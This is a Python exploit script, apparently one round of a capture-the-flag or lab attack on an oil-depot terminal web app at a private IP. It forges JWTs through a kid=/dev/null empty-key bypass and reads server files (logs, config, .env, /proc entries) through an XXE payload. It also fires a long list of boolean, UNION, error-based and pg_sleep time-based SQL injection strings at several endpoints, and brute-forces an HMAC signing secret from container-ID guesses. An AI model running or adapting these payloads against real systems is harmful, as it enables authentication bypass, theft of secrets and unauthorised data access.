#!/usr/bin/env python3
"""round76 — SQLi in probe/sign device + more file paths + log files + creative reads"""
import requests, json, time, hashlib, hmac as hm, base64, urllib.parse

HOST = "192.168.242.102"
CASPI = f"http://{HOST}:8007"

def b64u(d):
    if isinstance(d, str): d = d.encode()
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def jwt_forged(role="operator", sub="ctf", company="X", kid="/dev/null", key=b''):
    h = json.dumps({"alg":"HS256","typ":"JWT","kid":kid},separators=(',',':')).encode()
    p = json.dumps({"sub":sub,"company":company,"role":role,
        "iat":int(time.time()),"exp":int(time.time())+86400},separators=(',',':')).encode()
    m = b64u(h)+'.'+b64u(p)
    return m+'.'+b64u(hm.new(key, m.encode(), hashlib.sha256).digest())

AUTH_OP = {"Authorization": f"Bearer {jwt_forged('operator')}"}

def xxe_read(path, field="remarks", timeout=10):
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE ticket [<!ENTITY x SYSTEM "file://{path}">]>
<ticket>
  <reference>{"&x;" if field=="reference" else "r"}</reference>
  <tankId>T-01</tankId><product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"&x;" if field=="carrier" else "C"}</carrier>
  <remarks>{"&x;" if field=="remarks" else "R"}</remarks>
</ticket>'''
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=timeout)
        if r.status_code == 200:
            data = json.loads(r.text)
            return 200, data.get("summary", data.get("ticket", {})).get(field, "")
        return r.status_code, r.text
    except requests.exceptions.Timeout:
        return -1, "TIMEOUT"
    except Exception as e:
        return -2, str(e)

# ============================================================
print("="*70)
print("PHASE 0: HEALTH CHECK")
print("="*70)
try:
    r = requests.get(f"{CASPI}/api/auth/me", headers=AUTH_OP, timeout=8)
    print(f"  [{r.status_code}] {r.text[:100]}")
except Exception as e:
    print(f"  {e}")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 1: SQLi IN /api/ops/probe/sign?device=PAYLOAD")
print("="*70)

# Baseline: normal device
for dev in ["tk-01", "lm-01"]:
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign", params={"device": dev},
                        headers=AUTH_OP, timeout=8)
        print(f"  Baseline {dev}: [{r.status_code}] {r.text[:200]}")
    except Exception as e:
        print(f"  Baseline {dev}: {e}")
    time.sleep(0.3)

# Nonexistent device
try:
    r = requests.get(f"{CASPI}/api/ops/probe/sign", params={"device": "nonexistent"},
                    headers=AUTH_OP, timeout=8)
    print(f"  nonexistent: [{r.status_code}] {r.text[:100]}")
except Exception as e:
    print(f"  nonexistent: {e}")

time.sleep(0.5)

# SQLi tests
sqli_payloads = [
    # Boolean-based
    ("true AND", "tk-01' AND '1'='1"),
    ("false AND", "tk-01' AND '1'='2"),
    ("true OR", "' OR '1'='1"),
    ("true OR --", "' OR '1'='1'--"),
    ("true OR #", "' OR '1'='1' #"),
    # Double-quote
    ('dbl true', 'tk-01" AND "1"="1'),
    ('dbl false', 'tk-01" AND "1"="2'),
    # UNION SELECT
    ("union1", "' UNION SELECT 'http://127.0.0.1:3000/healthz'--"),
    ("union2", "nonexistent' UNION SELECT url FROM devices LIMIT 1--"),
    ("union3", "' UNION SELECT 'http://127.0.0.1:3000/api/auth/me'--"),
    # Error-based
    ("error cast", "tk-01' AND 1=CAST((SELECT version()) AS int)--"),
    ("error div0", "tk-01' AND 1/(SELECT 0)=0--"),
    # Time-based (careful - don't sleep too long)
    ("sleep2", "tk-01'; SELECT pg_sleep(2)--"),
    ("sleep2b", "tk-01' AND (SELECT pg_sleep(2))::text='1"),
    ("sleep2c", "tk-01' OR (SELECT pg_sleep(2))::text='1"),
    # Stacked queries
    ("stacked", "tk-01'; SELECT 1--"),
    # Without quotes (numeric context?)
    ("no quote", "1 OR 1=1"),
    ("no quote2", "1 UNION SELECT url FROM devices LIMIT 1"),
    # PostgreSQL specific
    ("pg version", "' UNION SELECT version()--"),
    ("pg tables", "' UNION SELECT table_name FROM information_schema.tables LIMIT 1--"),
    ("pg current_db", "' UNION SELECT current_database()--"),
]

for desc, payload in sqli_payloads:
    start = time.time()
    try:
        r = requests.get(f"{CASPI}/api/ops/probe/sign",
                        params={"device": payload},
                        headers=AUTH_OP, timeout=8)
        elapsed = time.time() - start
        body = r.text[:200].replace('\n', ' ').strip()
        if r.status_code == 200:
            print(f"  *** SQLi HIT! {desc}: [{r.status_code}] {body} ***")
        elif r.status_code == 500:
            print(f"  [500] {desc}: {body[:80]} (time={elapsed:.1f}s)")
        elif elapsed > 1.5:
            print(f"  [{r.status_code}] {desc}: time={elapsed:.1f}s *** SLOW! ***")
        else:
            # Print 403s concisely
            if r.status_code == 403:
                pass  # Expected for non-SQLi
            else:
                print(f"  [{r.status_code}] {desc}: {body[:80]}")
    except requests.exceptions.Timeout:
        elapsed = time.time() - start
        print(f"  *** TIMEOUT {desc}: time={elapsed:.1f}s — POSSIBLE TIME-BASED SQLi ***")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

print("  (403 results hidden — expected for failed injection)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 2: SQLi IN PROBE POST BODY")
print("="*70)

# What if the url or sig field is used in a DB query?
probe_sqli = [
    ("url with sql", {"url": "' OR 1=1--", "sig": "abc"}),
    ("url union", {"url": "' UNION SELECT 'test'--", "sig": "abc"}),
    ("sig with sql", {"url": "http://gauge-gw.internal:9100/v1/tanks/1/level", "sig": "' OR '1'='1"}),
]

for desc, payload in probe_sqli:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json=payload,
                         headers=AUTH_OP, timeout=8)
        body = r.text[:200].replace('\n', ' ')
        if r.status_code not in [403, 500]:
            print(f"  *** {desc}: [{r.status_code}] {body}")
        elif r.status_code == 500:
            print(f"  [500] {desc}: {body[:100]}")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 3: SQLi IN CUSTODY INGEST (via XML field values)")
print("="*70)
print("  Testing if ticket fields are used in unsafe SQL queries")

# Send a custody ticket with SQL in the reference field
sqli_tickets = [
    ("ref union", "reference", "' UNION SELECT current_database()--"),
    ("ref sleep", "reference", "'; SELECT pg_sleep(2)--"),
    ("tank union", "tankId", "' UNION SELECT version()--"),
    ("carrier union", "carrier", "' UNION SELECT table_name FROM information_schema.tables LIMIT 1--"),
]

for desc, field_name, payload in sqli_tickets:
    xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<ticket>
  <reference>{"r" if field_name != "reference" else payload}</reference>
  <tankId>{"T-01" if field_name != "tankId" else payload}</tankId>
  <product>D</product>
  <grossVolume>1</grossVolume><netVolume>1</netVolume>
  <density>1</density><temperature>1</temperature>
  <carrier>{"C" if field_name != "carrier" else payload}</carrier>
  <remarks>R</remarks>
</ticket>'''
    start = time.time()
    try:
        r = requests.post(f"{CASPI}/api/ops/custody/ingest",
            data=xml, headers={**AUTH_OP, "Content-Type":"application/xml"}, timeout=8)
        elapsed = time.time() - start
        if r.status_code == 200:
            data = r.json()
            summary = data.get("summary", {})
            result_val = summary.get(field_name.lower().replace("tankid","tank_id"), "")
            if result_val != payload:
                print(f"  *** DIFFERENT! {desc}: sent={payload[:50]}, got={result_val[:100]}")
            if elapsed > 1.5:
                print(f"  *** SLOW! {desc}: time={elapsed:.1f}s")
        else:
            print(f"  [{r.status_code}] {desc}")
    except requests.exceptions.Timeout:
        print(f"  *** TIMEOUT {desc} — POSSIBLE TIME-BASED SQLi ***")
    except Exception as e:
        print(f"  {desc}: {e}")
    time.sleep(0.3)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 4: LOG FILES + CONFIG FILES")
print("="*70)

log_config_paths = [
    # Log files
    "/var/log/gunicorn/access.log",
    "/var/log/gunicorn/error.log",
    "/var/log/gunicorn.log",
    "/var/log/app.log",
    "/var/log/flask.log",
    "/var/log/supervisor/supervisord.log",
    "/var/log/syslog",
    "/var/log/messages",
    "/tmp/gunicorn.log",
    "/tmp/app.log",
    "/app/gunicorn.log",
    "/app/app.log",
    "/app/logs/app.log",
    "/app/logs/error.log",
    # Config files we haven't tried
    "/app/config.ini",
    "/app/config.toml",
    "/app/config.yml",
    "/app/settings.cfg",
    "/app/secrets.conf",
    "/app/probe.conf",
    "/app/probe_secret",
    "/app/probe_secret.txt",
    "/app/.probe_secret",
    "/app/secret.txt",
    "/app/.secret",
    "/app/secret",
    "/app/SECRET",
    "/app/PROBE_SECRET",
    "/app/.probe",
    # wsgi variants
    "/app/wsgi.py",
    "/app/run.py",
    "/app/main.py",
    "/app/server.py",
    "/app/constants.py",
    "/app/secrets.py",
    "/app/models.py",
    "/app/routes.py",
    "/app/views.py",
    "/app/utils.py",
    "/app/helpers.py",
    "/app/probe.py",
    "/app/ops.py",
    # gunicorn log locations
    "/var/log/gunicorn-access.log",
    "/var/log/gunicorn-error.log",
    # Docker-specific
    "/var/log/docker.log",
    # Environment files
    "/etc/environment",
    "/etc/default/locale",
    "/etc/profile.d/docker.sh",
    "/etc/profile.d/app.sh",
    "/root/.env",
    "/root/.bashrc_additions",
]

for path in log_config_paths:
    code, val = xxe_read(path, timeout=5)
    if code == 200 and val:
        lines = val.split('\n')
        preview = val[:500]
        print(f"  *** {path} ({len(val)} bytes) ***")
        print(f"      {preview}")
    elif code == 400:
        print(f"  EXISTS(400): {path}")
    time.sleep(0.08)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 5: GUNICORN WORKER PIDs + /proc EXPLORATION")
print("="*70)

# Find worker PIDs
code, val = xxe_read("/proc/1/task/1/children", timeout=5)
if code == 200 and val:
    print(f"  PID 1 children: {val}")
    worker_pids = val.strip().split()
    for pid in worker_pids[:5]:
        # Try reading worker-specific info
        for subpath in ["status", "comm", "sched"]:
            code2, val2 = xxe_read(f"/proc/{pid}/{subpath}", timeout=4)
            if code2 == 200 and val2:
                lines = val2.split('\n')[:3]
                print(f"    PID {pid}/{subpath}: {' | '.join(l.strip() for l in lines)}")
            time.sleep(0.05)
else:
    # Try to find PIDs by scanning
    print(f"  /proc/1/task/1/children: [{code}]")
    print("  Scanning for gunicorn worker PIDs...")
    found_pids = []
    for pid in range(2, 30):
        code, val = xxe_read(f"/proc/{pid}/comm", timeout=3)
        if code == 200 and val:
            print(f"    PID {pid}: {val.strip()}")
            found_pids.append(pid)
        time.sleep(0.05)

# ============================================================
print("\n\n"+"="*70)
print("PHASE 6: FULL CONTAINER ID AS PROBE_SECRET")
print("="*70)

# From mountinfo: full container ID
full_id = "5407f6317f5cb1c5e178d2edd9fe960f73126e60833d9c1f297d13d9ddeb1e75"

url1 = b"http://gauge-gw.internal:9100/v1/meters/loading-arm-1/flow"
sig1 = bytes.fromhex("5b6fbf6d129fc68146d36bb3be3770ccd3eee953b23347115edfdc48d97d3b09")

# Test various forms of the container ID
id_candidates = [
    full_id,
    full_id[:32],
    full_id[:16],
    full_id[:12],  # hostname
    full_id.upper(),
    full_id[:32].upper(),
    f"khs-oil-depot_{full_id[:12]}",
    f"khs-oil-depot-terminal-{full_id[:12]}",
    "khs-oil-depot",
    "oil-depot",
    "terminal",
    "terminal-web",
    "caspiterminal",
]

for candidate in id_candidates:
    h = hm.new(candidate.encode(), url1, hashlib.sha256).digest()
    if h == sig1:
        print(f"  *** PROBE_SECRET = {candidate!r} ***")
print(f"  Tested {len(id_candidates)} container ID variants — no match")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 7: KID ORACLE — VERIFY IF SPECIFIC FILES CONTAIN PROBE_SECRET")
print("="*70)
print("  If PROBE_SECRET is in a file, setting kid=that_file and computing")
print("  JWT with HMAC(PROBE_SECRET, jwt_payload) would give 200")
print("")
print("  Approach: Use probe HMAC pairs to check if a file's content = PROBE_SECRET")
print("  We CANNOT do this directly through kid oracle (different HMAC messages)")
print("  But we CAN use kid oracle to check if a file EXISTS and is non-empty")

# Test whether auth.py / entrypoint.sh content matches any pattern
# by checking if kid with known files + keys we know gives 200
#
# Actually, let's try a DIFFERENT approach:
# If PROBE_SECRET is the content of a file, we can try to:
# 1. Use that file as kid
# 2. Compute JWT signed with PROBE_SECRET as key
# 3. If the file content == PROBE_SECRET, the JWT should be valid

# We know PROBE_SECRET signs probes. But we DON'T know PROBE_SECRET.
# Unless we can extract it from the signed probe data...

# WAIT — new idea: Use the probe/sign endpoint to GENERATE the HMAC
# then use THAT as the JWT key!
# If kid=<file> and file content = PROBE_SECRET:
#   JWT_sig = HMAC(file_content, jwt_unsigned) = HMAC(PROBE_SECRET, jwt_unsigned)
#
# We know HMAC(PROBE_SECRET, url) = probe_sig
# But HMAC(PROBE_SECRET, jwt_unsigned) ≠ probe_sig (different message)
# So we can't just use the probe_sig as JWT sig

# BUT: What if we make the JWT unsigned part EQUAL to a probe URL?
# Then HMAC(PROBE_SECRET, jwt_unsigned) = HMAC(PROBE_SECRET, url) = probe_sig!

# The JWT unsigned part is: base64(header) + "." + base64(payload)
# The probe URL is: http://gauge-gw.internal:9100/v1/tanks/1/level

# These are different strings — we can't make them equal because JWT has specific format

# UNLESS... we could control BOTH the kid AND make the message match
# This is getting circular. Let me try a simpler approach.

# Simple test: does /etc/environment exist and contain useful env vars?
code, val = xxe_read("/etc/environment", timeout=5)
if code == 200 and val:
    print(f"  /etc/environment: {val[:500]}")
else:
    print(f"  /etc/environment: [{code}]")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 8: PROBE ACTUAL CASE SENSITIVITY TEST")
print("="*70)

# The round75 "case change" test was buggy (replace didn't match)
# Let's test ACTUAL case changes
url_base = "http://gauge-gw.internal:9100/v1/tanks/1/level"
sig_base = "ece8b8f9671e56962dcb233b483c94fd1ea7384ec10d27288925572c6a44c803"

case_tests = [
    ("original", url_base),
    ("Level", url_base.replace("level", "Level")),
    ("LEVEL", url_base.replace("level", "LEVEL")),
    ("Tanks", url_base.replace("tanks", "Tanks")),
    ("V1", url_base.replace("v1", "V1")),
    ("HTTP", url_base.replace("http", "HTTP")),
    ("scheme", url_base.replace("http://", "HTTP://")),
    ("host upper", url_base.replace("gauge-gw.internal", "GAUGE-GW.INTERNAL")),
]

for desc, url in case_tests:
    try:
        r = requests.post(f"{CASPI}/api/ops/probe", json={"url": url, "sig": sig_base},
                         headers=AUTH_OP, timeout=8)
        if r.status_code == 200:
            print(f"  *** ACCEPTED! {desc}: {url}")
        else:
            pass  # Expected 403
    except:
        pass
    time.sleep(0.3)

print("  (Only 200s shown — 403 is expected for changed URLs)")

# ============================================================
print("\n\n"+"="*70)
print("PHASE 9: CREATIVE /proc READS FOR SECRETS")
print("="*70)

# What about /proc/self/task/N/environ for different threads?
# Even different threads share the same environ, but let's verify
for subpath in [
    "attr/current",   # SELinux/AppArmor context
    "attr/prev",      # Previous context
    "personality",    # Process personality
    "cpuset",         # CPU set
    "cgroup",         # Control group
    "io",             # I/O statistics
    "sessionid",      # Session ID
    "loginuid",       # Login UID
    "oom_adj",        # OOM adjustment
    "oom_score",      # OOM score
    "oom_score_adj",  # OOM score adjustment
    "coredump_filter", # Core dump filter
    "timerslack_ns",  # Timer slack
    "autogroup",      # Autogroup
]:
    code, val = xxe_read(f"/proc/self/{subpath}", timeout=4)
    if code == 200 and val:
        val_clean = val.strip()
        if val_clean:
            print(f"  /proc/self/{subpath}: {val_clean}")
    time.sleep(0.05)

# One more: try /proc/self/smaps_rollup
code, val = xxe_read("/proc/self/smaps_rollup", timeout=5)
if code == 200 and val:
    lines = val.split('\n')[:5]
    print(f"  smaps_rollup: {' | '.join(l.strip() for l in lines if l.strip())}")

# Try /proc/self/stack
code, val = xxe_read("/proc/self/stack", timeout=5)
if code == 200 and val:
    print(f"  stack: {val[:200]}")

print("\n"+"="*70)
print("DONE")
print("="*70)
